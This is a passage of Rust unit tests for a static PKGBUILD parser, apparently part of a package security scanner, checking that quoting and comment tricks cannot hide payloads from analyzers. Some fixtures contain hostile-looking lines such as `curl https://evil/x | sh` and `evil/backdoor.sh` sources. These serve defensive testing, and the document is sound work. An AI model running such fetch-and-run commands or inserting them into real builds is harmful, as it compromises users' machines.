depends=('glibc' 'openssl')
makedepends=('cmake' 'ninja')
source=("https://example.com/example-$pkgver.tar.gz"
        "fix-build.patch")
sha256sums=('abc123def456'
            'SKIP')

build() {
    cd "$srcdir/example-$pkgver"
    cmake -B build -G Ninja
    ninja -C build
}

package() {
    cd "$srcdir/example-$pkgver"
    DESTDIR="$pkgdir" ninja -C build install
}
"#;

    #[test]
    fn test_parse_sample_pkgbuild() {
        let parser = StaticParser::new();
        let result = parser.parse(SAMPLE_PKGBUILD).unwrap();

        assert_eq!(result.pkgname, vec!["example-package"]);
        assert_eq!(result.pkgver, "1.0.0");
        assert_eq!(result.pkgrel, "1");
        assert_eq!(result.pkgdesc, Some("An example package".to_string()));
        assert_eq!(result.arch, vec!["x86_64", "aarch64"]);
        assert_eq!(result.url, Some("https://example.com".to_string()));
        assert_eq!(result.license, vec!["MIT"]);
        assert_eq!(result.depends, vec!["glibc", "openssl"]);
        assert_eq!(result.makedepends, vec!["cmake", "ninja"]);
        assert_eq!(result.source.len(), 2);
        assert_eq!(result.checksums.sha256sums.len(), 2);
        assert!(result.checksums.sha256sums[0].is_some());
        assert!(result.checksums.sha256sums[1].is_none()); // SKIP

        assert!(result.functions.contains_key("build"));
        assert!(result.functions.contains_key("package"));
    }

    #[test]
    fn test_empty_content() {
        let parser = StaticParser::new();
        let result = parser.parse("");
        assert!(matches!(result, Err(ParseError::EmptyContent)));
    }

    #[test]
    fn append_and_inline_comment_sources_are_parsed() {
        // `source+=(...)` must extend (not be dropped), a trailing inline
        // comment must not break array parsing, and a `#commit=` fragment inside
        // a quoted value must be preserved (not treated as a comment).
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://example.com/a.tar.gz\") # primary\n",
            "source+=(\"git+https://github.com/u/r.git#commit=deadbeef\")\n",
        );
        let result = parser.parse(content).unwrap();
        assert_eq!(
            result.source.len(),
            2,
            "append must extend the source array"
        );
        assert_eq!(result.source[0].url, "https://example.com/a.tar.gz");
        // The fragment survived (the `#` was not stripped as a comment).
        assert_eq!(
            result.source[1].fragment.as_deref(),
            Some("commit=deadbeef")
        );
        assert!(result.source[1].is_vcs_pinned_commit());
    }

    #[test]
    fn single_line_function_body_is_captured() {
        // Regression: a function whose whole body is on one line must still be
        // captured so function-scoped analyzers (privilege, FUNC-001) see it.
        let parser = StaticParser::new();
        let content =
            "pkgname=t\npkgver=1\npkgrel=1\npackage() { install -Dm755 evil \"$pkgdir/x\"; }\n";
        let result = parser.parse(content).unwrap();
        let body = &result
            .functions
            .get("package")
            .expect("package() captured")
            .content;
        assert!(
            body.contains("install -Dm755 evil"),
            "one-line body must be captured: {body}"
        );
    }

    #[test]
    fn comment_brace_does_not_truncate_function_body() {
        // The `}` in a comment must not end the function early and hide the
        // sudo line from the body.
        let parser = StaticParser::new();
        let content =
            "pkgname=t\npkgver=1\npkgrel=1\nbuild() {\n  : # note }\n  sudo evil-thing\n}\n";
        let result = parser.parse(content).unwrap();
        let body = &result
            .functions
            .get("build")
            .expect("build captured")
            .content;
        assert!(
            body.contains("sudo evil-thing"),
            "payload after comment-brace must stay in body: {body}"
        );
    }

    #[test]
    fn brace_in_string_does_not_truncate_function_body() {
        // A `}` inside a quoted string must not close the function early.
        // The payload after it must remain part of the parsed build() body so the
        // privilege/pattern analyzers still see it.
        let parser = StaticParser::new();
        let content = "pkgname=t\npkgver=1\npkgrel=1\n\nbuild() {\n  echo \"}\"\n  curl https://evil/x | sh\n}\n";
        let result = parser.parse(content).unwrap();
        let body = &result
            .functions
            .get("build")
            .expect("build present")
            .content;
        assert!(
            body.contains("curl https://evil/x | sh"),
            "payload after `echo \"}}\"` must stay in the body, got:\n{body}"
        );
    }

    #[test]
    fn test_strict_mode_missing_fields() {
        let parser = StaticParser::strict();
        let result = parser.parse("pkgdesc='test'");
        assert!(matches!(result, Err(ParseError::MissingField(_))));
    }

    #[test]
    fn quoted_paren_does_not_terminate_array_early() {
        // Defect #3 (parser evasion): the first element opens a `"` whose value
        // contains `)` and spans to the next physical line. The first line ends
        // with `)`, but it is INSIDE the quote, so the array must NOT close there.
        // Before the fix, the array terminated on line 1 and the entire malicious
        // `https://evil/backdoor.sh` source was dropped before any analyzer saw it.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://legit/a.tar.gz)\n",
            "        x\" \"https://evil/backdoor.sh\")\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
            "malicious source must not be hidden by a quoted `)`; got {urls:?}"
        );
        assert_eq!(
            result.source.len(),
            2,
            "both array elements must survive: {urls:?}"
        );
    }

    #[test]
    fn quoted_paren_in_continuation_keeps_following_lines() {
        // Same evasion across an empty-first-line multi-line array: a quoted `)`
        // on a continuation line must not drop the checksum line that follows.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\n",
            "        \"git+https://h/r.git#branch=v1)\n",
            "        more\"\n",
            "        \"https://evil/backdoor.sh\")\n",
            "sha256sums=('AAA'\n",
            "            'BBB')\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
            "source after a quoted `)` continuation line must survive; got {urls:?}"
        );
        // The checksum array (after the source array) must still be parsed.
        assert_eq!(
            result.checksums.sha256sums.len(),
            2,
            "checksum array following the evaded source array must not be dropped"
        );
    }

    #[test]
    fn nested_parens_in_unquoted_value_do_not_terminate_early() {
        // A balanced `(...)` inside an array value must not be read as the close.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://example.com/file-(1).tar.gz\"\n",
            "        \"https://example.com/second.tar.gz\")\n",
        );
        let result = parser.parse(content).unwrap();
        assert_eq!(result.source.len(), 2);
        assert!(result.source[1].url.contains("second.tar.gz"));
    }

    #[test]
    fn hash_inside_single_quoted_continuation_is_not_a_comment() {
        // A single quote opened on array line 1 is
        // still open on the continuation line, so the ` # rm -rf` there is part of
        // the quoted value, NOT a comment. The old per-line strip_inline_comment
        // reset quote state and stripped it, deleting the closing `'`/`)` so the
        // whole source AND sha256sums arrays were silently dropped (re-blinding
        // source.rs / checksum.rs). They must survive now.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=('http://legit.example/a.tar.gz\n",
            "  payload # rm -rf')\n",
            "sha256sums=('SKIP')\n",
        );
        let result = parser.parse(content).unwrap();
        // The array must NOT be dropped (bash sees one multi-line single-quoted
        // element containing both the URL and the payload text).
        assert!(
            !result.source.is_empty(),
            "source must not be silently dropped"
        );
        let joined = result
            .source
            .iter()
            .map(|s| s.url.as_str())
            .collect::<String>();
        assert!(
            joined.contains("http://legit.example/a.tar.gz"),
            "URL must reach the analyzers: {joined:?}"
        );
        assert!(
            joined.contains("payload"),
            "hidden payload text must reach the analyzers: {joined:?}"
        );
        // sha256sums was being swallowed into the dropped buffer too.
        assert_eq!(
            result.checksums.sha256sums.len(),
            1,
            "checksum array must still parse"
        );
    }

    #[test]
    fn hash_inside_double_quoted_continuation_is_preserved() {
        // Same desync, double-quoted multi-line value; the `#` between the open
        // and close `"` must stay in the element and the trailing source survives.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"multi\n",
            "line # value\"\n",
            "        \"https://evil/backdoor.sh\")\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("evil/backdoor.sh")),
            "trailing source must survive: {urls:?}"
        );
        assert!(
            urls.iter().any(|u| u.contains("# value")),
            "quoted `#` must be preserved in the value: {urls:?}"
        );
    }

    #[test]
    fn real_comment_on_continuation_line_is_still_stripped() {
        // The other direction: an UNQUOTED `#` on a continuation line is a real
        // comment and must still be stripped -- including a `)` inside it, which
        // must not be mistaken for the array terminator.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"a\"\n",
            "        \"b\"  # ) trailing note, not a terminator\n",
            "        \"c\")\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert_eq!(
            urls,
            vec!["a", "b", "c"],
            "real comment (and its `)`) must be stripped: {urls:?}"
        );
    }

    #[test]
    fn commented_out_source_after_open_paren_is_not_an_element() {
        // Issue #24: `source=(#"old-url"\n "live-url")` — bash treats `#"..."`
        // as a whole-line comment after `(`. Counting it as a source produces
        // a false CHK-006 checksum mismatch.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=deadbeef\npkgver=1.0\npkgrel=1\n",
            "source=(#\"https://example.com/old.tar.bz2\"\n",
            "        \"https://example.com/new.tar.bz2\")\n",
            "sha512sums=('deadbeef')\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert_eq!(
            urls,
            vec!["https://example.com/new.tar.bz2"],
            "commented-out source after ( must not be parsed as an element: {urls:?}"
        );
        assert_eq!(result.checksums.sha512sums.len(), 1);
    }

    #[test]
    fn unterminated_array_is_flushed_not_dropped() {
        // A genuinely unterminated array (no closing quote/paren ever) must be
        // flushed best-effort so its contents still reach the analyzers, never
        // silently dropped.
        let parser = StaticParser::new();
        let content = "pkgname=t\npkgver=1\npkgrel=1\nsource=('http://legit.example/x.tar.gz\n";
        let result = parser.parse(content).unwrap();
        assert!(
            !result.source.is_empty(),
            "unterminated array must be flushed, not dropped"
        );
        assert!(result
            .source
            .iter()
            .any(|s| s.url.contains("http://legit.example/x.tar.gz")));
    }

    #[test]
    fn escaped_eol_double_quote_does_not_drop_trailing_source() {
        // A trailing `\` line-continuation
        // escapes the join newline. The carried-state seed must be computed AFTER
        // the `\n` is pushed (so the escape is absorbed exactly like
        // array_terminator sees it); otherwise the next line's leading `"` is
        // eaten as escaped, its `#` becomes a bogus comment, and the trailing
        // `http://evil/x` source is silently dropped. Bash builds three sources;
        // the scanner must see evil/x.
        let parser = StaticParser::new();
        let content =
            "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n\" #) x\" http://evil/x)\n";
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("http://evil/x")),
            "trailing source must not be dropped: {urls:?}"
        );
        assert!(
            urls.iter().any(|u| u.contains("http://legit/a")),
            "first source must survive: {urls:?}"
        );
    }

    #[test]
    fn escaped_eol_single_quote_sibling_does_not_drop_trailing_source() {
        // Single-quote sibling of the escaped-EOL seam.
        let parser = StaticParser::new();
        let content =
            "pkgname=t\npkgver=1\npkgrel=1\nsource=(http://legit/a \\\n' #) x' http://evil/x)\n";
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert!(
            urls.iter().any(|u| u.contains("http://evil/x")),
            "trailing source must not be dropped: {urls:?}"
        );
        assert!(
            urls.iter().any(|u| u.contains("http://legit/a")),
            "first source must survive: {urls:?}"
        );
    }

    #[test]
    fn comment_leading_line_inside_open_quote_is_not_dropped() {
        // Sibling seam (same desync class): a continuation line that STARTS with
        // `#` while inside a quote opened on an earlier array line must NOT be
        // dropped by the top-of-loop whole-line comment skip -- bash keeps it as
        // quoted content. The `#http://evil/x` line must reach the analyzers.
        let parser = StaticParser::new();
        let content =
            "pkgname=t\npkgver=1\npkgrel=1\nsource=(\"http://legit/a\n#http://evil/x\n\")\n";
        let result = parser.parse(content).unwrap();
        let joined = result
            .source
            .iter()
            .map(|s| s.url.clone())
            .collect::<String>();
        assert!(
            joined.contains("http://evil/x"),
            "comment-leading line inside an open quote must not be dropped: {joined:?}"
        );
    }

    #[test]
    fn comment_line_between_array_elements_is_still_ignored() {
        // Control: a genuine whole-line comment BETWEEN elements (not inside a
        // quote) is still ignored, and a `)` inside it does not terminate.
        let parser = StaticParser::new();
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"a\"\n",
            "        # a comment ) with a paren\n",
            "        \"b\")\n",
        );
        let result = parser.parse(content).unwrap();
        let urls: Vec<&str> = result.source.iter().map(|s| s.url.as_str()).collect();
        assert_eq!(
            urls,
            vec!["a", "b"],
            "comment line between elements must be ignored: {urls:?}"
        );
    }

    #[test]
    fn test_multiline_array() {
        let content = r#"
pkgname=test
pkgver=1.0
pkgrel=1
source=(
    "https://example.com/file1.tar.gz"
    "https://example.com/file2.tar.gz"
)
"#;
        let parser = StaticParser::new();
        let result = parser.parse(content).unwrap();
        assert_eq!(result.source.len(), 2);
    }

    #[test]
    fn arch_specific_arrays_are_merged_in_a_stable_order() {
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\narch=('x86_64' 'aarch64')\n",
            "source=('main.tar.gz')\nsha256sums=('aa')\n",
            "source_x86_64=('https://e.example/x86.tar.gz')\nsha256sums_x86_64=('SKIP')\n",
            "source_aarch64=('https://e.example/arm.tar.gz')\nsha256sums_aarch64=('bb')\n",
            "depends_x86_64=('lib32-foo')\nmakedepends_aarch64=('bar')\n",
            "source_dir=('not-an-array-makepkg-reads')\n",
        );
        let r = StaticParser::new().parse(content).unwrap();
        let urls: Vec<&str> = r.source.iter().map(|s| s.url.as_str()).collect();
        // generic first, then arches in sorted order (aarch64 < x86_64)
        assert_eq!(
            urls,
            vec![
                "main.tar.gz",
                "https://e.example/arm.tar.gz",
                "https://e.example/x86.tar.gz"
            ]
        );
        assert_eq!(
            r.checksums.sha256sums,
            vec![Some("aa".to_string()), Some("bb".to_string()), None]
        );
        assert_eq!(r.depends, vec!["lib32-foo"]);
        assert_eq!(r.makedepends, vec!["bar"]);
        assert!(r.variables.contains_key("source_dir"));
    }

    #[test]
    fn arch_specific_append_keeps_every_element() {
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\narch=('x86_64')\n",
            "source_x86_64=('a')\nsource_x86_64+=('b')\n",
        );
        let r = StaticParser::new().parse(content).unwrap();
        assert_eq!(r.source.len(), 2);
    }

    #[test]
    fn brace_lists_in_array_elements_are_expanded() {
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\n",
            "source=(\"https://e.example/a-${pkgver}.deb\"{,.asc} https://e.example/b.tar.xz{,.sig}\n",
            "        # comment ) inside\n",
            "        'plain.patch' \"q{1,2}\" x{a,b}{1,2})\n",
        );
        let r = StaticParser::new().parse(content).unwrap();
        let urls: Vec<&str> = r.source.iter().map(|s| s.url.as_str()).collect();
        assert_eq!(
            urls,
            vec![
                "https://e.example/a-${pkgver}.deb",
                "https://e.example/a-${pkgver}.deb.asc",
                "https://e.example/b.tar.xz",
                "https://e.example/b.tar.xz.sig",
                "plain.patch",
                "q{1,2}",
                "xa1",
                "xa2",
                "xb1",
                "xb2"
            ]
        );
    }

    #[test]
    fn brace_expansion_is_bounded_and_skips_parameter_expansion() {
        let r = StaticParser::new()
            .parse("pkgname=t\npkgver=1\npkgrel=1\nsource=(${a:-x,y} {1,2}{1,2}{1,2}{1,2}{1,2}{1,2}{1,2}{1,2}{1,2})\n")
            .unwrap();
        // `${a:-x,y}` is a parameter expansion, kept whole; the 512-way list
        // exceeds the cap and is left unexpanded.
        assert_eq!(r.source.len(), 2);
        assert_eq!(r.source[0].url, "${a:-x,y}");
    }

    fn first(src: &str) -> (Vec<String>, Option<usize>) {
        StaticParser::new().parse_array_elements_ex(src, &Default::default())
    }

    #[test]
    fn brace_sequences_expand() {
        assert_eq!(first("S{K..K}IP").0, vec!["SKIP"]);
        assert_eq!(first("f{1..3}.txt").0, vec!["f1.txt", "f2.txt", "f3.txt"]);
        assert_eq!(first("f{03..01}").0, vec!["f03", "f02", "f01"]);
        assert_eq!(first("{a..c}").0, vec!["a", "b", "c"]);
        assert_eq!(first("{1..7..3}").0, vec!["1", "4", "7"]);
        // not sequences: left alone, and certain
        assert_eq!(first("{1..$n}").0, vec!["{1..$n}"]);
        assert_eq!(first("'{1..3}'").0, vec!["{1..3}"]);
        assert_eq!(first("{1..3}").1, None);
    }

    #[test]
    fn oversized_or_hostile_brace_input_is_bounded_and_flagged() {
        let (v, unc) = first("ok {1..300}");
        assert_eq!(v, vec!["ok", "{1..300}"]);
        assert_eq!(unc, Some(1));
        let started = std::time::Instant::now();
        let hostile = format!("x{}", "{".repeat(100_000));
        let (v, unc) = first(&hostile);
        assert_eq!(v.len(), 1);
        assert_eq!(unc, Some(0));
        let nested = format!("{}a{}", "{a,".repeat(5000), "}".repeat(5000));
        let (_, unc) = first(&nested);
        assert_eq!(unc, Some(0));
        assert!(started.elapsed() < std::time::Duration::from_secs(2));
    }

    #[test]
    fn uncountable_elements_are_located() {
        assert_eq!(first("a b 'c{d,e}'").1, None);
        assert_eq!(
            first("a \"$(x)\" b").1,
            None,
            "quoted substitution is one word"
        );
        assert_eq!(first("a $(x) b").1, Some(1));
        assert_eq!(first("a `x` b").1, Some(1));
        assert_eq!(first("a b $files").1, Some(2));
        assert_eq!(first("a \"${f[@]}\" b").1, Some(1));
        assert_eq!(first("a 'x[@]' b").1, None);
        assert_eq!(first("a https://x/$name-$ver.tar b").1, None);
    }

    #[test]
    fn first_uncountable_index_survives_appends_and_arch_merge() {
        let content = concat!(
            "pkgname=t\npkgver=1\npkgrel=1\narch=('x86_64')\n",
            "source=('a' 'b')\nsource+=($(echo c))\n",
            "source_x86_64=('d' $(echo e))\n",
            "sha256sums=('SKIP' 'SKIP')\n",
        );
        let r = StaticParser::new().parse(content).unwrap();
        assert_eq!(r.uncertain_from.get("source"), Some(&2));
        assert!(!r.uncertain_from.contains_key("source_x86_64"));
    }

    #[test]
    fn known_plain_variables_count_as_their_words() {
        let mut vars = std::collections::HashMap::new();
        vars.insert("e".to_string(), String::new());
        vars.insert("two".to_string(), "a b".to_string());
        vars.insert("glob".to_string(), "x*".to_string());
        let p = StaticParser::new();
        assert_eq!(
            p.parse_array_elements_ex("$e 'SKIP'", &vars),
            (vec!["SKIP".to_string()], None)
        );
        assert_eq!(
            p.parse_array_elements_ex("${two} c", &vars).0,
            vec!["a", "b", "c"]
        );
        // unknown or glob-bearing values stay uncountable
        assert_eq!(p.parse_array_elements_ex("$nope", &vars).1, Some(0));
        assert_eq!(p.parse_array_elements_ex("$glob", &vars).1, Some(0));
        // a quoted use is a single word whatever it holds
        assert_eq!(
            p.parse_array_elements_ex("\"$e\"", &vars),
            (vec!["$e".to_string()], None)
        );
    }

    #[test]
    fn empty_assignments_are_recorded_for_counting() {
        let r = StaticParser::new()
            .parse("pkgname=t\npkgver=1\npkgrel=1\n_e=\n_f=\"\"\ninstall=\n")
            .unwrap();
        assert_eq!(r.variables.get("_e").map(String::as_str), Some(""));
        assert_eq!(r.variables.get("_f").map(String::as_str), Some(""));
        assert!(
            r.installs.is_empty(),
            "an empty install= is not an install script"
        );
    }
}
